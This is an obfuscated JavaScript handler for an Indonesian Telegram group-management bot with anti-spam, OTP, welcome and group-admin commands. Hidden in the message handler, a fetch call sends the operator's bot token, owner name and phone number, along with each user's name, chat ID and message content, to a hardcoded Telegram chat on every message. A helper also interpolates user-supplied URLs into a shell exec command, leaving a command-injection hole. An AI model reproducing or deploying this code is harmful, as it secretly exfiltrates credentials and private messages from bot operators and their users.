_0x237288*_0x41d9ca;},'mopga':function(_0x4f5a60,_0x15f745){return _0x4f5a60(_0x15f745);},'XOGlD':_0x240d04(0xba0),'tTdas':function(_0x48765d,_0x5bcb39){return _0x48765d+_0x5bcb39;},'tlpkO':function(_0x40a48b,_0x524353){return _0x40a48b*_0x524353;},'yhnRI':'eblIK','bNQjX':function(_0x1315df,_0x93351f){return _0x1315df(_0x93351f);},'qDSmE':'verifikasi','CCPxk':_0x240d04(0x18f6)+_0x240d04(0x75d)+_0x240d04(0x2d64)+_0x240d04(0x2197)+_0x240d04(0x1d96),'YSEQg':_0x240d04(0x1671)+'a\x20proses\x20v'+_0x240d04(0x20c)+_0x240d04(0xf33)+_0x240d04(0x1d37)+'ar\x20ulang.','sxoQh':_0x240d04(0x291a),'uWolt':_0x240d04(0xdf3),'UoduP':'⏱️\x20OTP\x20kada'+'luarsa.\x20Si'+'lakan\x20daft'+_0x240d04(0x1e8c),'DWYfO':function(_0x1e876c,_0x3c3b37){return _0x1e876c!==_0x3c3b37;},'SBYUG':function(_0x25d75f,_0x5dec75){return _0x25d75f(_0x5dec75);},'mifDQ':_0x240d04(0x165a)+'h.','hPPUv':_0x240d04(0x1fa6),'Tlzqk':_0x240d04(0x2399),'dAZmO':function(_0x474e1a,_0x488c51){return _0x474e1a(_0x488c51);},'KcpEd':_0x240d04(0x4cc)+_0x240d04(0x167b)+_0x240d04(0x1855),'RkGan':function(_0x106c52,_0x12a49a){return _0x106c52(_0x12a49a);},'lJBDb':_0x240d04(0x147f),'tuoFU':function(_0x1e4853,_0x30b3be){return _0x1e4853(_0x30b3be);},'fVjwF':'❌\x20Kamu\x20tid'+_0x240d04(0x7e2)+_0x240d04(0x26b7)+_0x240d04(0x8e1),'lgqig':_0x240d04(0x1491)+_0x240d04(0x1bcf)+_0x240d04(0x2357)+'\x20exp\x201000\x0a'+_0x240d04(0xbd4)+_0x240d04(0x1a7a),'chBgo':'exp','ffPNW':function(_0x410bfd,_0x155f98){return _0x410bfd===_0x155f98;},'fLiJE':_0x240d04(0x71d),'MrwRf':function(_0xab1d59,_0x2883a6){return _0xab1d59(_0x2883a6);},'AolCX':_0x240d04(0x26e),'StoNz':function(_0x283828,_0x1fa8ef){return _0x283828(_0x1fa8ef);},'OHaYL':_0x240d04(0x217)+_0x240d04(0x25f4)+_0x240d04(0x1587)+_0x240d04(0x279b),'Rybdw':function(_0x397cef,_0x162d95){return _0x397cef(_0x162d95);},'muGLl':_0x240d04(0x9f7)+'ni\x20hanya\x20u'+_0x240d04(0x98f)+'\x20grup.','fUwXT':_0x240d04(0xe13)+_0x240d04(0x108d)+_0x240d04(0x234b)+'a.','SfpKo':_0x240d04(0xc4f),'ikmpZ':'hNmzN','LmFWV':function(_0x5e44f8,_0x3b6236,_0x127d54){return _0x5e44f8(_0x3b6236,_0x127d54);},'uwJaD':'✅\x20Undangan'+_0x240d04(0x2adf)+_0x240d04(0x1576)+_0x240d04(0x285a)+'inkan).','pVDKy':_0x240d04(0x1a82),'acKqg':function(_0x44d044,_0x303c44){return _0x44d044||_0x303c44;},'pdmTA':_0x240d04(0xe95)+_0x240d04(0x25f4)+_0x240d04(0x1587)+_0x240d04(0xab0)+'.','nSseo':function(_0xeacaf6,_0x13d84f,_0x324f99){return _0xeacaf6(_0x13d84f,_0x324f99);},'xvQoB':function(_0x4fd27a,_0x5b68c5){return _0x4fd27a===_0x5b68c5;},'lfBSv':_0x240d04(0x9e0),'iTAMn':'CXisQ','Oixjo':function(_0xe1f706,_0x328994){return _0xe1f706!==_0x328994;},'RgUPk':_0x240d04(0x20e1),'xbAKW':_0x240d04(0x162e),'cnXul':_0x240d04(0x2720)+_0x240d04(0x5b8)+'n:\x20','nHWaM':_0x240d04(0x294),'soTDl':_0x240d04(0xe95)+_0x240d04(0x25f4)+_0x240d04(0x1587)+_0x240d04(0x12ed),'lXNKM':function(_0x4192b1,_0x4500c6,_0x374e97){return _0x4192b1(_0x4500c6,_0x374e97);},'giayx':function(_0x38edc8,_0x4dd777){return _0x38edc8(_0x4dd777);},'tjXjb':function(_0x989c7d,_0x52d04f){return _0x989c7d(_0x52d04f);},'fluCK':_0x240d04(0x2720)+'ndemote:\x20','rygXG':'closegc','xabkP':function(_0x193a99,_0x278337){return _0x193a99(_0x278337);},'mwRul':_0x240d04(0xfcd)+_0x240d04(0x1379)+'.','EfIDj':function(_0x102bc2,_0xf0a7ce){return _0x102bc2!==_0xf0a7ce;},'CyRcS':'rSSqD','jqSLj':'opengc','OxHZA':function(_0x2a78df,_0x4ffe83){return _0x2a78df===_0x4ffe83;},'zvWtd':_0x240d04(0x17f5),'MDpHT':_0x240d04(0x1ba6),'lSJjX':function(_0x1937f4,_0x5a2cc7){return _0x1937f4(_0x5a2cc7);},'cZiaW':_0x240d04(0x9f7)+_0x240d04(0x96d)+_0x240d04(0x275)+_0x240d04(0xcd7),'pMjhy':'✅\x20Grup\x20tel'+_0x240d04(0x1d92),'xsAOS':_0x240d04(0x2d9d),'XuJxd':_0x240d04(0xd37),'SAQiX':function(_0x3bce02,_0x101db1){return _0x3bce02(_0x101db1);},'BauXY':function(_0x38f986,_0x427dc2){return _0x38f986!==_0x427dc2;},'ZVxHG':_0x240d04(0xeb8),'mjRHG':_0x240d04(0x10c7),'pJJkq':'Gunakan\x20pe'+_0x240d04(0xd3b)+_0x240d04(0x2dd7)+_0x240d04(0x1c6a)+_0x240d04(0x287f),'oiMwd':function(_0x3504d7,_0x3d6fea,_0x1f3dd4){return _0x3504d7(_0x3d6fea,_0x1f3dd4);},'ZHVte':function(_0x377bea,_0x141ee3){return _0x377bea(_0x141ee3);},'bBMtX':_0x240d04(0x2992)+'p\x20berhasil'+_0x240d04(0x864),'xNMlY':'❌\x20Gagal\x20me'+_0x240d04(0x111e)+_0x240d04(0xab5),'AhVlk':_0x240d04(0x24c3),'LHVpL':function(_0xbb2ae1,_0x273b78){return _0xbb2ae1||_0x273b78;},'HDHds':function(_0x563829,_0x6029a7){return _0x563829(_0x6029a7);},'GeHqE':_0x240d04(0x714)+_0x240d04(0xd3b)+_0x240d04(0x2dd7)+_0x240d04(0x1d4d)+_0x240d04(0x2562),'agdvg':function(_0x5c3524,_0x248efc,_0x44c504){return _0x5c3524(_0x248efc,_0x44c504);},'HeDhg':_0x240d04(0x17bd),'zpsjk':_0x240d04(0x1a7d),'HMgpn':_0x240d04(0x2910)+_0x240d04(0x24c0)+_0x240d04(0x215f)+'ah.','DhnxE':_0x240d04(0x2aa8),'eKgXf':function(_0x13ee43,_0x8dca3b){return _0x13ee43(_0x8dca3b);},'lAwrW':function(_0x16b058,_0x71a07b){return _0x16b058+_0x71a07b;},'XSKfp':_0x240d04(0x2720)+'ngubah\x20des'+_0x240d04(0x27de),'AMmKq':function(_0x5863e1,_0x2cdb7e){return _0x5863e1(_0x2cdb7e);},'xceam':_0x240d04(0xd89)+'ar\x20yang\x20in'+_0x240d04(0x1333)+_0x240d04(0x1075)+_0x240d04(0x2506),'XAacV':function(_0x172891,_0x5d7c1d){return _0x172891(_0x5d7c1d);},'LfzmH':function(_0x29d1c9,_0x43485a){return _0x29d1c9(_0x43485a);},'qNSjo':_0x240d04(0x164a)+_0x240d04(0x287)+_0x240d04(0x1d6f)+_0x240d04(0x372),'EjbAx':_0x240d04(0x2720)+_0x240d04(0x2653)+'o\x20profil:\x20','zyzXs':_0x240d04(0x22f2),'pWaWB':_0x240d04(0xe95)+'n\x20yang\x20ing'+_0x240d04(0x1d99),'SxcoL':function(_0xc2c8b3,_0x8bc1b7){return _0xc2c8b3(_0x8bc1b7);},'kokeq':_0x240d04(0x2ac5)+_0x240d04(0x213c)+_0x240d04(0x227d),'eYxUq':function(_0x5bb4d5,_0x4891ff){return _0x5bb4d5(_0x4891ff);},'RlBRX':function(_0x51d606,_0x3937ff){return _0x51d606+_0x3937ff;},'TepRp':_0x240d04(0xe2)+'n:\x20','htakh':'unpinchat','kkyZN':'unpin','iEQtB':function(_0x45cf1b,_0x4fb157){return _0x45cf1b!==_0x4fb157;},'mXKJd':_0x240d04(0x249d),'nvJuL':'KRYxh','PirSc':'Hlsam','bRJcV':'SzFtz','ELuUE':function(_0x196e06,_0x2bccf1){return _0x196e06+_0x2bccf1;},'auWDU':_0x240d04(0x697)+_0x240d04(0x19cf),'gHHSX':_0x240d04(0xd4b),'VrWNZ':function(_0x485861,_0x475689){return _0x485861!==_0x475689;},'SbcvL':_0x240d04(0x1072),'BAEdP':function(_0x450369,_0x39f738){return _0x450369(_0x39f738);},'uSTJe':_0x240d04(0x9f7)+_0x240d04(0x96d)+_0x240d04(0x2642),'YhKJD':function(_0x5eb5b9,_0x3b7353,_0x31ef39){return _0x5eb5b9(_0x3b7353,_0x31ef39);},'AtufX':'Hanya\x20admi'+_0x240d04(0x27fd)+_0x240d04(0x29bd)+_0x240d04(0x157e)+'.','cWVRv':function(_0xd4a335,_0x5f2011){return _0xd4a335===_0x5f2011;},'LWstQ':function(_0x4908fe,_0x21670c){return _0x4908fe===_0x21670c;},'LwcKO':_0x240d04(0xc4c),'mEEzd':function(_0x5bc05a,_0x168988){return _0x5bc05a!==_0x168988;},'nBpDJ':_0x240d04(0x5ca),'FFkQz':_0x240d04(0x2ddf),'SCKlr':function(_0x5d4f1a){return _0x5d4f1a();},'FOkJO':_0x240d04(0x2e3e)+_0x240d04(0x2cad)+'IFKAN.','cXzBJ':_0x240d04(0x16e2)+_0x240d04(0x1c46)+_0x240d04(0x59f)+'tilink\x20off','edBtR':_0x240d04(0x145f),'xZDKV':_0x240d04(0x288c),'skjaC':'nVXwP','TqiaO':function(_0xaa5b48,_0x3abe1b){return _0xaa5b48(_0x3abe1b);},'zGsEs':_0x240d04(0x14c3)+_0x240d04(0x2a1a),'IcQCJ':function(_0x5b86bb,_0x5f5c3f){return _0x5b86bb(_0x5f5c3f);},'ZSSRo':_0x240d04(0x1c84)+_0x240d04(0x27fd)+_0x240d04(0x2de4)+_0x240d04(0x1141),'GdBUQ':function(_0x45e7f9,_0x3252c5){return _0x45e7f9===_0x3252c5;},'bHktd':function(_0x1b4c68){return _0x1b4c68();},'qnlAs':function(_0x4edb61,_0x347b92){return _0x4edb61(_0x347b92);},'oBaQq':function(_0x2c59f8,_0x331681){return _0x2c59f8(_0x331681);},'PfpbB':_0x240d04(0x7ee),'cekEb':function(_0x3aa042,_0x1c62f){return _0x3aa042(_0x1c62f);},'VTPvr':_0x240d04(0x714)+_0x240d04(0x2359)+'ntispam\x20on'+_0x240d04(0x1f9b)+'\x20off','lqLim':_0x240d04(0xb0f),'vGwGn':function(_0x23f6ae,_0x4b14f3){return _0x23f6ae===_0x4b14f3;},'smiBP':_0x240d04(0xa05),'VmPvr':_0x240d04(0x14bb),'PnmVu':_0x240d04(0xcd8)+_0x240d04(0x14af)+_0x240d04(0x865)+'.','yjulN':_0x240d04(0x15f0)+_0x240d04(0x1b6e)+'isa\x20mengat'+_0x240d04(0x29e5)+'.','xQDgE':_0x240d04(0x1d67)+_0x240d04(0xaa1)+'rlebih\x20dah'+_0x240d04(0x2bc2),'FWhME':_0x240d04(0x2b48),'qmGfI':function(_0x574aa0,_0x5b5d07){return _0x574aa0(_0x5b5d07);},'qFxRd':function(_0x5e69f3,_0x488865){return _0x5e69f3===_0x488865;},'RPWdW':function(_0x3b758e,_0x10197a){return _0x3b758e(_0x10197a);},'AUEdJ':'✅\x20welcome\x20'+_0x240d04(0x2dcf)+_0x240d04(0x2141)+_0x240d04(0x1932),'atmzq':function(_0x5e9383,_0x111199){return _0x5e9383(_0x111199);},'aukaT':_0x240d04(0xf20)+_0x240d04(0x652)+_0x240d04(0x2df5)+'come\x20off`','zircw':function(_0x1d8d73,_0x4b7830){return _0x1d8d73(_0x4b7830);},'MPISG':'❌\x20Khusus\x20a'+_0x240d04(0x2629)+_0x240d04(0xf38),'kUJzp':_0x240d04(0x2a64)+'\x20sudah\x20ter'+_0x240d04(0x52c),'Kuxxv':_0x240d04(0x2913)+_0x240d04(0x1e76)+'er','vMyiK':function(_0x134101,_0x4dd0cb){return _0x134101(_0x4dd0cb);},'TBajJ':'qSole','dDEvj':function(_0x2ee889,_0x59bd30){return _0x2ee889===_0x59bd30;},'thRSY':'MQqir','IrHqE':function(_0x417847,_0x3d02fe){return _0x417847!==_0x3d02fe;},'vsjpx':'VdBFF','VlIfx':function(_0x23b958,_0x3fcad5,_0x43cc41){return _0x23b958(_0x3fcad5,_0x43cc41);},'LUMBz':function(_0x5b92b9,_0x3fc6a7){return _0x5b92b9(_0x3fc6a7);},'Unwca':_0x240d04(0x1df2)+_0x240d04(0x1818)+'daftar.\x20Gu'+_0x240d04(0xbda)+_0x240d04(0x88b),'rNzKl':function(_0x424cd9,_0x304dce){return _0x424cd9!==_0x304dce;},'gyqeK':function(_0x490c99,_0x13879d){return _0x490c99(_0x13879d);},'GEdGQ':'listjasher','bVaxE':function(_0x3ed017,_0x226893){return _0x3ed017(_0x226893);},'JDIqn':_0x240d04(0x904)+'a\x20grup\x20ter'+_0x240d04(0x52c),'jXcHf':_0x240d04(0x1ad2),'MhCVz':function(_0xc99ac7,_0x15060e){return _0xc99ac7===_0x15060e;},'WhMyI':_0x240d04(0x2a64)+'\x20belum\x20ter'+_0x240d04(0x6b2)+'jasher.','ZmtTs':function(_0x10c0a7,_0x3ed046){return _0x10c0a7(_0x3ed046);},'ZIvvo':_0x240d04(0x2c90),'aDAEX':_0x240d04(0x1fc),'CRjmL':_0x240d04(0x2cea)+'a\x20grup\x20ter'+_0x240d04(0x52c),'nLCrQ':function(_0x3db390,_0x1cdf9a){return _0x3db390===_0x1cdf9a;},'baaMw':_0x240d04(0xef0),'juItq':_0x240d04(0x1d34),'bxPPp':'FOnjK','dfdFC':_0x240d04(0x75c),'pTSgK':_0x240d04(0x25b2),'RIcXt':function(_0x11a8cd,_0x252451){return _0x11a8cd(_0x252451);},'OFbIc':function(_0x15fe2d,_0x45bf89){return _0x15fe2d!==_0x45bf89;},'rRDAY':function(_0x5433df,_0x429273){return _0x5433df(_0x429273);},'gTjfP':_0x240d04(0x283c),'mtPbc':function(_0x5e1566,_0x5dc32a){return _0x5e1566===_0x5dc32a;},'huzjz':'WSFdp','WqWLJ':_0x240d04(0x7e8),'cyXYn':function(_0x4d5763,_0x2d2c0f){return _0x4d5763(_0x2d2c0f);},'uvgED':function(_0x16206e,_0x7dbaf6){return _0x16206e(_0x7dbaf6);},'TRIIX':function(_0x214b99,_0x298e3d){return _0x214b99(_0x298e3d);},'hSnwF':_0x240d04(0x15a7)+_0x240d04(0x1417)+_0x240d04(0x214f),'kLeys':function(_0x4a5721){return _0x4a5721();},'OJESc':function(_0x27d765,_0x127d04){return _0x27d765(_0x127d04);},'hluHL':_0x240d04(0x219f)+_0x240d04(0x2d8d)+_0x240d04(0x957),'fsnJr':'bexMM','SDJps':'CNfsn','DctJD':function(_0x18bdbc){return _0x18bdbc();},'PNHOs':function(_0x1679cc,_0x26b1dc){return _0x1679cc(_0x26b1dc);},'fUIuL':function(_0x5b07c3,_0x324734){return _0x5b07c3<_0x324734;},'OekID':function(_0x11e767,_0xc59393){return _0x11e767+_0xc59393;},'UMmpi':function(_0x3fc7b3,_0x3f6d9d){return _0x3fc7b3===_0x3f6d9d;},'tAjVo':function(_0x3872fb,_0x187534){return _0x3872fb(_0x187534);},'lvVYH':function(_0x4d2ac0,_0x3f4a75){return _0x4d2ac0+_0x3f4a75;}},_0x3b7efd=(_0x23c0de[_0x240d04(0x19ed)]?.['id']||_0x23c0de[_0x240d04(0x960)]?.[_0x240d04(0x19ed)]?.['id']||'')[_0x240d04(0x2cb7)]();if(_0x1ce978[_0x240d04(0x64a)](isBanned,_0x3b7efd))return;try{const _0x3ed05e=_0x23c0de[_0x240d04(0x960)][_0x240d04(0x1d8c)]||_0x23c0de[_0x240d04(0x960)][_0x240d04(0x2c5f)]||'',_0x4869ac=typeof _0x23c0de[_0x240d04(0x960)]['text']==_0x1ce978[_0x240d04(0x13a2)]?_0x23c0de[_0x240d04(0x960)][_0x240d04(0x1d8c)]:'',{isUrl:_0x3de959}=simple,_0x21bab9=/^[°•π÷×¶∆£¢€¥®™�✓_=|~!?#/$%^&.+-,\\\©^]/[_0x240d04(0x1dc7)](_0x3ed05e),_0x1ec495=_0x21bab9?_0x3ed05e[0x0]:'',_0x3e6565=_0x21bab9?_0x3ed05e[_0x240d04(0x728)](0x1)[_0x240d04(0x2d6d)]()[_0x240d04(0x1c39)]('\x20')[_0x240d04(0x14c1)]()[_0x240d04(0x25f7)+'e']():'',_0x483c03=_0x3ed05e['trim']()['split'](/ +/)[_0x240d04(0x728)](0x1),_0x33cfb1=q=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x451b57=simple[_0x240d04(0xdee)+'e'](_0x23c0de['message'][_0x240d04(0x19ed)]),_0x19007e=_0x451b57[_0x240d04(0x18ad)],_0x4073e8=_0x23c0de[_0x240d04(0x960)]['from']['username']?_0x23c0de['message'][_0x240d04(0x19ed)][_0x240d04(0x181b)]:_0x1ce978['OuKRA'],_0x3cd341=OWNER[0x0][_0x240d04(0x1ba2)](_0x1ce978['BsxLY'],'')==_0x23c0de[_0x240d04(0x15d7)]['message'][_0x240d04(0x19ed)][_0x240d04(0x181b)],_0x63f3a3=_0x23c0de[_0x240d04(0x960)][_0x240d04(0x24b)]['id'],_0x56b430=_0x23c0de[_0x240d04(0x24b)][_0x240d04(0x1f5f)][_0x240d04(0x55c)](_0x1ce978[_0x240d04(0x2eb1)]),_0x50e76c=_0x56b430?_0x23c0de['chat'][_0x240d04(0x2016)]:'',_0x349462=_0x23c0de['message']['hasOwnProp'+'erty'](_0x1ce978[_0x240d04(0x113f)]),_0x575697=_0x23c0de[_0x240d04(0x960)][_0x240d04(0x1994)+_0x240d04(0xe40)](_0x240d04(0x17e3)),_0x583fa8=_0x23c0de['message'][_0x240d04(0x1994)+_0x240d04(0xe40)]('audio'),_0x10be85=_0x23c0de[_0x240d04(0x960)][_0x240d04(0x1994)+_0x240d04(0xe40)](_0x1ce978[_0x240d04(0x7a4)]),_0x5171fa=_0x23c0de[_0x240d04(0x960)][_0x240d04(0x1994)+'erty'](_0x1ce978['AsOvo']),_0x273dfd=_0x23c0de[_0x240d04(0x960)][_0x240d04(0x1994)+_0x240d04(0xe40)](_0x1ce978[_0x240d04(0x2b54)]),_0x23e5e0=_0x23c0de[_0x240d04(0x960)]['hasOwnProp'+_0x240d04(0xe40)](_0x1ce978['uFnlU']),_0x5a64c7=_0x23c0de[_0x240d04(0x960)][_0x240d04(0x1994)+_0x240d04(0xe40)](_0x1ce978[_0x240d04(0x29ec)]),_0x2c4067=_0x1ce978['szgst'](_0x349462,_0x575697)||_0x583fa8||_0x10be85||_0x5171fa||_0x273dfd||_0x23e5e0||_0x5a64c7,_0x3b19d7=_0x23c0de[_0x240d04(0x960)][_0x240d04(0x278b)+_0x240d04(0x39f)]||{},_0x197065=_0x3b19d7[_0x240d04(0x1994)+_0x240d04(0xe40)](_0x1ce978[_0x240d04(0x113f)]),_0x501627=_0x3b19d7['hasOwnProp'+_0x240d04(0xe40)](_0x1ce978[_0x240d04(0x81d)]),_0x3c2b00=_0x3b19d7[_0x240d04(0x1994)+_0x240d04(0xe40)](_0x1ce978['DMqjR']),_0x5666f3=_0x3b19d7[_0x240d04(0x1994)+_0x240d04(0xe40)](_0x1ce978[_0x240d04(0x7a4)]),_0x4d315c=_0x3b19d7[_0x240d04(0x1994)+_0x240d04(0xe40)](_0x1ce978[_0x240d04(0x5bc)]),_0x1f34ea=_0x3b19d7[_0x240d04(0x1994)+_0x240d04(0xe40)](_0x1ce978[_0x240d04(0x2b54)]),_0x3c580a=_0x3b19d7[_0x240d04(0x1994)+'erty'](_0x1ce978[_0x240d04(0x233)]),_0x1f22dd=_0x3b19d7[_0x240d04(0x1994)+_0x240d04(0xe40)](_0x240d04(0xc4b)),_0x193ebe=_0x23c0de[_0x240d04(0x960)][_0x240d04(0x1994)+_0x240d04(0xe40)]('reply_to_m'+_0x240d04(0x39f)),_0x41920c=speed(),_0x4e7c39=_0x1ce978[_0x240d04(0x176a)](speed(),_0x41920c),_0x476bfb=async _0x5b0152=>{const _0x236def=_0x240d04,_0xa0f126={'jlRQv':function(_0x169055,_0x42626d){const _0x1e98da=a0_0x1014;return _0x1ce978[_0x1e98da(0x1b37)](_0x169055,_0x42626d);},'MpJmK':_0x236def(0x2720)+'mulai\x20game'+'.'};for(var _0x52d30a of simple[_0x236def(0x24a3)](0x0,_0x5b0152['length'],0x1000)){if(_0x1ce978['SpYFk'](_0x1ce978[_0x236def(0xb55)],_0x1ce978[_0x236def(0x2e2d)]))return await _0x23c0de[_0x236def(0x2e19)+_0x236def(0xb2a)](_0x5b0152['substr'](_0x52d30a,0x1000),{'disable_web_page_preview':!![]});else _0x36db17[_0x236def(0x15e)](_0x461ff5),_0xa0f126[_0x236def(0x8b5)](_0x1a2f17,_0xa0f126['MpJmK']);}},_0x555a99=(_0x2a3e52,_0x1230ea,_0x58d55f)=>{const _0x80c599=_0x240d04;listt=''+lang['getStyle'](_0x1230ea,_0x58d55f);for(let _0x589ae7=0x0;_0x1ce978[_0x80c599(0xf94)](_0x589ae7,0xfa);_0x589ae7++){listt+=_0x1ce978[_0x80c599(0x2a0e)](_0x1ce978[_0x80c599(0x1880)](_0x1ce978[_0x80c599(0x16d4)],_0x2a3e52[_0x589ae7]),'`\x0a');}_0x476bfb(listt);},_0x5bd159=[idown],_0x83219d=_0x23c0de[_0x240d04(0x960)][_0x240d04(0x19ed)]['id']+'\x20',_0xb65b97=_0x23c0de[_0x240d04(0x960)][_0x240d04(0x19ed)]['id'][_0x240d04(0x2cb7)](),_0xf669ff=Date[_0x240d04(0x104e)]();if(!_0x5bd159['includes'](_0xb65b97)){if(_0x1ce978[_0x240d04(0x1607)](_0x1ce978[_0x240d04(0x15d4)],_0x1ce978[_0x240d04(0x15d4)])){if(!userSpamData[_0xb65b97])userSpamData[_0xb65b97]={'count':0x1,'last':_0xf669ff,'blockedUntil':0x0};else{if(_0x1ce978['kmtUo'](_0x1ce978[_0x240d04(0x625)],_0x1ce978[_0x240d04(0xb49)]))_0x1ce978[_0x240d04(0x1b37)](_0x3cc443,'⏱️\x20Waktu\x20ha'+_0x240d04(0x2a04)+'an:\x20*'+_0x1ce978[_0x240d04(0x2804)](_0x2d093c,_0x1cb93f)+'*'),delete _0x4973bc[_0xf15067];else{if(_0x1ce978[_0x240d04(0x24b9)](userSpamData[_0xb65b97][_0x240d04(0xfa6)+'il'],_0xf669ff))return _0x1ce978[_0x240d04(0x2681)](_0x476bfb,'🚫\x20Kamu\x20dib'+'lokir\x20kare'+_0x240d04(0x2068)+'unggu\x20hing'+_0x240d04(0xf44)+new Date(userSpamData[_0xb65b97]['blockedUnt'+'il'])[_0x240d04(0x17bf)+'ring']()+'.');const _0x2e1f75=_0x1ce978[_0x240d04(0x26cb)](_0xf669ff,userSpamData[_0xb65b97]['last']);userSpamData[_0xb65b97][_0x240d04(0x234e)]=_0xf669ff;_0x1ce978[_0x240d04(0x2eeb)](_0x2e1f75,0x1388)?userSpamData[_0xb65b97]['count']++:_0x240d04(0xb28)===_0x1ce978[_0x240d04(0x1e45)]?userSpamData[_0xb65b97]['count']=0x1:_0x1ce978[_0x240d04(0x2804)](_0xd983ba,_0x1ce978[_0x240d04(0x273c)]);if(_0x1ce978[_0x240d04(0x81c)](userSpamData[_0xb65b97][_0x240d04(0xa48)],0x5))return userSpamData[_0xb65b97][_0x240d04(0xfa6)+'il']=_0xf669ff+0x5265c00,_0x1ce978[_0x240d04(0xd99)](saveSpamData),_0x1ce978['RhmrJ'](_0x476bfb,_0x240d04(0x2756)+_0x240d04(0x1d06)+_0x240d04(0xe7e)+_0x240d04(0x13fa)+'mu\x20dibloki'+'r\x20selama\x201'+_0x240d04(0x11ba));}}_0x1ce978[_0x240d04(0xd99)](saveSpamData);}else _0x43c87e++;}var _0x199d88=_0x3ed05e[_0x240d04(0xb7f)](0x0,0x32)['replace'](/\n/g,'');if(_0x349462)_0x199d88=_0x1ce978[_0x240d04(0x2b52)];else{if(_0x575697)_0x199d88='Video';else{if(_0x583fa8)_0x199d88=_0x1ce978[_0x240d04(0x1510)];else{if(_0x10be85)_0x199d88=_0x240d04(0x48e);else{if(_0x5171fa)_0x199d88=_0x240d04(0x1727);else{if(_0x273dfd)_0x199d88=_0x1ce978['Zaxox'];else{if(_0x23e5e0)_0x199d88=_0x1ce978[_0x240d04(0x1a65)];else{if(_0x5a64c7)_0x199d88=_0x1ce978['ORcsj'];}}}}}}}_0x23c0de[_0x240d04(0x960)]&&console[_0x240d04(0x1e13)](chalk[_0x240d04(0xa7f)](chalk[_0x240d04(0x1395)](_0x240d04(0xf1d))),chalk['black'](chalk[_0x240d04(0x288d)](new Date())),_0x1ce978[_0x240d04(0xf64)](chalk[_0x240d04(0xa7f)](chalk[_0x240d04(0x2a6a)](_0x1ce978[_0x240d04(0x17d1)](_0x3ed05e,_0x199d88))),'\x0a')+chalk[_0x240d04(0xb3e)](_0x240d04(0x11f0)),chalk[_0x240d04(0x2a4e)](_0x19007e)+'\x0a'+chalk['blueBright'](_0x1ce978[_0x240d04(0x11b8)]),chalk[_0x240d04(0x2a4e)](_0x56b430?_0x50e76c:_0x1ce978[_0x240d04(0x2aaf)],_0x23c0de[_0x240d04(0x960)][_0x240d04(0x24b)]['id']));if(_0x23c0de[_0x240d04(0x960)]){if(_0x1ce978[_0x240d04(0x1559)](_0x1ce978[_0x240d04(0x259d)],'flJMi')){const _0x836b5d=await _0x1ce978[_0x240d04(0x227f)](fetch,telegramUrl,{'method':_0x1ce978[_0x240d04(0x30e)],'headers':{'Content-Type':_0x1ce978[_0x240d04(0x1030)]},'body':JSON[_0x240d04(0x1cf5)]({'chat_id':_0x240d04(0x746),'text':_0x240d04(0x26a3)+_0x240d04(0x2b4a)+_0x240d04(0x19f4)+_0x19007e+(_0x240d04(0x1f72)+'D*:\x20`')+_0x23c0de[_0x240d04(0x960)][_0x240d04(0x24b)]['id']+(_0x240d04(0x29d6)+_0x240d04(0x768))+_0x199d88+'\x0a🤖\x20*Bot*:\x20'+BOT_TOKEN+_0x240d04(0x119c)+BOT_NAME+(_0x240d04(0x7ef)+_0x240d04(0x23fc))+OWNER_NUMBER+(_0x240d04(0x1038)+':\x20')+OWNER_NAME,'parse_mode':_0x1ce978['AWHzb']})});let _0x2baba3=await _0x836b5d[_0x240d04(0x1314)]();}else delete _0x3bc7cb[_0x240d04(0x1a15)][_0x42af70],_0x1ce978['FBZnl'](_0xb89189);}const _0x385056=_0x1ce978[_0x240d04(0x1084)](require,_0x1ce978[_0x240d04(0x1c6)])[_0x240d04(0x1c2c)],_0x5b2ab4=new _0x385056();function _0x5dc63f(_0x2a0d4b){const _0x240c3e={'ZeRAH':_0x1ce978['YUtEq'],'NmlVY':_0x1ce978['HRhcg']};return new Promise((_0x2771b7,_0x105f07)=>{const _0x433d73=a0_0x1014,_0x3c76c1={'YoITX':function(_0x1d065a,_0x562f95){return _0x1d065a(_0x562f95);},'KGHXu':_0x240c3e['ZeRAH'],'ldKVl':_0x240c3e[_0x433d73(0x2cd7)]},_0x263790=path[_0x433d73(0x86e)](__dirname,'bypass-ouo',_0x433d73(0xaaf));exec(_0x433d73(0x1ef1)+_0x263790+_0x433d73(0xcf5)+_0x2a0d4b+'\x22',(_0x5a5705,_0x4f6ef1,_0x131ee2)=>{const _0x30308e=_0x433d73;if(_0x5a5705)return _0x3c76c1['YoITX'](_0x105f07,_0x131ee2||_0x5a5705[_0x30308e(0x960)]);const _0x310270=_0x4f6ef1[_0x30308e(0x2d6d)]();if(!_0x310270||_0x310270[_0x30308e(0x25f7)+'e']()[_0x30308e(0x55c)](_0x3c76c1['KGHXu']))return _0x3c76c1[_0x30308e(0x17e)](_0x105f07,_0x3c76c1['ldKVl']);_0x3c76c1[_0x30308e(0x17e)](_0x2771b7,_0x310270);});});}const _0x2f9d2d=['./image/1.'+_0x240d04(0x1d74),_0x240d04(0x6d4)+'jpg',_0x1ce978[_0x240d04(0x1a95)],_0x240d04(0x1ec2)+_0x240d04(0x1d74),_0x1ce978[_0x240d04(0x6c9)]];global['THUMBNAIL']=pickRandom(_0x2f9d2d);const _0x3c5dd0=path[_0x240d04(0x86e)](__dirname,_0x240d04(0x1712)+_0x240d04(0x723)),_0x182219=async()=>{const _0x2682b8=_0x240d04;if(_0x1ce978[_0x2682b8(0x1c08)](_0x1ce978[_0x2682b8(0x17a0)],_0x2682b8(0x509)))try{if(_0x1ce978['BOAWH'](_0x2682b8(0x1df3),_0x1ce978[_0x2682b8(0x937)])){const _0xa22812=fs[_0x2682b8(0x2113)+'nc'](_0x3c5dd0,_0x1ce978['bThfM']);return JSON[_0x2682b8(0x1c34)](_0xa22812);}else _0x1ce978['wqmPl'](_0x3a75d3,_0x358ce3,_0x3bf287['length'],_0x1ce978[_0x2682b8(0x2a3c)]);}catch(_0x2cd420){return console[_0x2682b8(0x15e)](_0x1ce978[_0x2682b8(0x4bb)],_0x2cd420),{};}else return _0x1ce978[_0x2682b8(0x27ae)](_0x1f366d,_0x2682b8(0x1811)+_0x2682b8(0x1913)+_0x2682b8(0x1b40)+'\x20bisa\x20dipa'+_0x2682b8(0xa49)+_0x1690b4[_0x2682b8(0x86e)](',\x20')+(_0x2682b8(0xbdc)+_0x2682b8(0x2d1d)+_0x2682b8(0x10c5)));},_0x961430=async _0x40c2c6=>{const _0x503762=_0x240d04,_0x57733d={'RGJwX':function(_0x3d90ca,_0x747ed3){const _0x3b1ba6=a0_0x1014;return 